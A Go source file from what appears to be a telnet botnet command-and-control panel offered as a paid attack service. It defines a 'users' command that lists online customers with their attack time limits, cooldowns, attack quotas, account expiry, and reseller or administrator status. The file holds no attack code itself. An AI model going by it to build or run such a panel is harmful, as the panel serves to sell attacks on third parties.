package subcommands

import (
	"advanced-telnet-cnc/packages/format"
	"advanced-telnet-cnc/packages/simpletable"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"fmt"
	"strings"
)

func init() {
	command.Subcommand("users", &command.SubCommand{
		Aliases: []string{"sessions", "online"},
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session, parent *command.Command) error {
			table := simpletable.New()
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "Username"},
					{Align: simpletable.AlignCenter, Text: "Duration"},
					{Align: simpletable.AlignCenter, Text: "Cooldown"},
					{Align: simpletable.AlignCenter, Text: "Attacks"},
					{Align: simpletable.AlignCenter, Text: "Account Expiry"},
					{Align: simpletable.AlignCenter, Text: "Session Time"},
				},
			}

			for i, profile := range sessions.Clone() {
				left, max, err := profile.Attacks()
				if err != nil {
					return err
				}

				var symbol = ""
				if winterTemp(max, left, 30) {
					symbol = "\u001B[93m⚠ \u001B[0m"
				}

				if profile.Admin {
					symbol = "\u001B[31m★ \u001B[0m"
				}

				if profile.Reseller {
					symbol = "\u001B[95m★ \u001B[0m"
				}

				r := []*simpletable.Cell{
					{Align: 0, Text: fmt.Sprintf("%d", i+1)},
					{Align: 0, Text: symbol + profile.Name},
					{Align: 0, Text: fmt.Sprintf("%d", profile.MaxTime)},
					{Align: 0, Text: fmt.Sprintf("%d", profile.Cooldown)},
					{Align: 0, Text: fmt.Sprintf("%d/%d", left, max)},
					{Align: 0, Text: format.Format(profile.Expiry)},
					{Align: 0, Text: format.Format(profile.Created)},
				}

				table.Body.Cells = append(table.Body.Cells, r)
			}

			table.SetStyle(simpletable.StyleCompactLite)
			session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))
			return session.Println(" \x1b[31m★ \x1b[0mAdministrator | \x1b[95m★ \x1b[0mReseller | \x1b[93m⚠ \x1b[0mHigh Attack Usage")
		},
	})
}
